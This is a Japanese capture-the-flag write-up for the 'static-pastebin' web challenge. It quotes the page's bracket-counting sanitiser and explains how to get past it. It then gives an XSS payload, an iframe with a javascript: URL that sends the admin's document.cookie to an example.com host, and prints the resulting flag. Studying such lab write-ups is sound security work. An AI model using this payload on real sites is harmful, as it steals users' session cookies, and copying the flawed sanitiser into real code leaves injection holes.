# static-pastebin (374 solves/ 373 points)

> I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it here
> Site: ...
> Note: The site is entirely static. Dirbuster will not be useful in solving it.

## solution

与えられたURLにアクセスすると、Static pastebinというサイトにつながった。
テキストエリアに文字列を入力してCreateボタンを押すと、https://..../paste/#<Base64エンコードされた入力文字列>へ移動し、入力した文字列が表示される。

また、adminをstatic-pastebinで作成したページへ訪問させることができる。

入力された文字列を表示するページでは、このjavscriptを実行していた。

```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}
```
文字列の中に`<`が見つかるとbracketsに1加算、`>`が見つかるとbracketsから1減算、bracketsが0の時はresultに先頭からi番目の文字列を追加するという処理を行っている。
特にエスケープを行っている様子はないのでうまくすればXSSできそうである。

`>`を入力してから`<`を入力するとbracketsの値をうまく0に調節できる。
よって、`><iframe src="javascript:window.location.href='https://example.com/?'+document.cookie">`を入力して表示させるとうまくページ遷移させることができたので、これをadminに踏ませるとフラグが手に入る。

```
flag{54n1t1z4t10n_k1nd4_h4rd}
```
